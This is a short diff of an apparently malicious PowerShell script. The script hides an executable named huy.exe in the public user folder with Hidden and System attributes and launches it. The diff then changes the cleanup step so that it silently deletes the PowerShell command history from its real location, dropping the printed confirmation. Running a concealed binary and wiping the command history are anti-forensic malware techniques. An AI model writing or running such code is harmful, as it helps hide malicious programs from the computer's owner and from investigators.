@@ -17,9 +17,8 @@ $fileInfo = New-Object System.IO.FileInfo('C:\Users\Public\huy.exe');
 $fileInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System;
 Start-Process "C:\Users\Public\huy.exe";
 
-if (Test-Path $filePath) {
-    Remove-Item $filePath -Force
-    Write-Output "The file ConsoleHost_history.txt has been deleted."
+if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
 }
 
 exit
